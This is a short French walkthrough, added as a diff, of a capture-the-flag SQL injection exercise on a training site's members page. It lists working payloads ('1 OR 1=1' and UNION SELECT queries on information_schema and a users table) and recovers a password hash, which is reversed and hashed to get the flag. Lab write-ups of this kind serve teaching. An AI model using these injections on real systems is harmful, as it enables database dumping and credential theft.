@@ -1,0 +1,50 @@
+on va dans la page members, et la on voit qu'on peut envoyer un ID et que la page nous retourne la liste d'utilisateurs qui ont cet id
+
+donc on essaye 1 OR 1=1 et on obtient une liste d'utilisateurs dont flag (j'imagine que son id est le flag)
+
+en envoyant : 1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata on reupere les noms de db suivants:
+
+information_schema
+Member_Brute_Force
+Member_Sql_Injection
+Member_guestbook
+Member_images
+Member_survey
+
+
+avec : 1 UNION ALL SELECT NULL,version()
+
+on recupere :
+
+5.5.44-0ubuntu0.12.04.1
+
+on envoie : 
+
+1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
+
+et on recupere beaucoup de donnees
+
+
+on fait aussi 1 AND 1=2 UNION SELECT Commentaire, planet FROM users
+
+et on recupere :
+
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Surname : 42
+
+on fait donc
+
+1 AND 1=2 UNION SELECT Commentaire, countersign FROM users
+
+et on recupere :
+
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Surname : 5ff9d0165b4f92b14994e5c685cdce28
+
+quand on reverse le MD5 on recupere : FortyTwo
+
+lowered : fortytwo
+
+sha256 sur fortytwo : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+qui estdonc notre flag
